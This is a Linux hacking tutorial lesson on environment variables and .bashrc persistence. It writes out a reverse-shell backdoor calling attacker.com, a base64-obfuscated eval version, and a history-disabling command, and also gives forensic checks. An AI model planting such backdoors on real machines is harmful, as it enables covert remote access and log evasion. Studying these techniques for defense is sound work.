# Day 8 – Environment Variables & .bashrc Abuse
<img width="1200" height="400" alt="image" src="https://github.com/user-attachments/assets/889f5ffe-e362-4c06-a357-c83ab0bb131b" />

Environment variables define the execution context of Linux shells. But in hacking, they can be used to hide payloads, manipulate system behavior, or establish persistence.

---

## 🌐 What Are Environment Variables?

Use these commands to list or reference variables:
```bash
printenv
env
echo $HOME
echo $PATH
```
| Variable    | Purpose                             |
| ----------- | ----------------------------------- |
| `$PATH`     | Defines where binaries are searched |
| `$USER`     | Current user                        |
| `$HOME`     | User's home directory               |
| `$SHELL`    | Default shell                       |
| `$HISTFILE` | Shell history file path             |

## 🧠 Why This Matters in Hacking
You can override $PATH to run your own malicious binaries

You can disable shell history:   
```
export HISTFILE=/dev/null
```
You can leak system info using environment variables   

## 📂 Bash Startup Files

| File              | Trigger                   |
| ----------------- | ------------------------- |
| `~/.bashrc`       | On each interactive shell |
| `~/.bash_profile` | On login                  |
| `/etc/profile`    | System-wide login config  |

## 🔁 Persistence with .bashrc
Inject a backdoor:   
```
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bashrc
```

Or hide it in a more stealthy way:
```
echo "eval \$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx | base64 -d)" >> ~/.bashrc
```
On next terminal session? Backdoor triggers.
``
### 🧪 Task of the Day
View `.bashrc`:
```
cat ~/.bashrc
```
Add a harmless test:
```
echo 'echo "Hacked by $USER on $(date)"' >> ~/.bashrc
```
Open a new terminal and observe.   
To clean it:
```
nano ~/.bashrc
```
## 🔐 Red Team + Blue Team Tips

| Use Case       | Technique                                                              |
| -------------- | ---------------------------------------------------------------------- |
| Persistence    | Append payload to `.bashrc`                                            |
| Log wiping     | Set `$HISTFILE=/dev/null`                                              |
| Evasion        | Use base64 + eval                                                      |
| IR / Forensics | Always check `.bashrc`, `.profile`, `/etc/profile` for unusual entries |

📡 Learn these techniques, payloads, and real-world red teaming via:   
➡️ https://t.me/cybersecplayground

---

Be ready for **Day 9**, where we’ll cover **processes, services**, and how hackers use `ps`, `top`, and `systemctl` to enumerate and escalate.



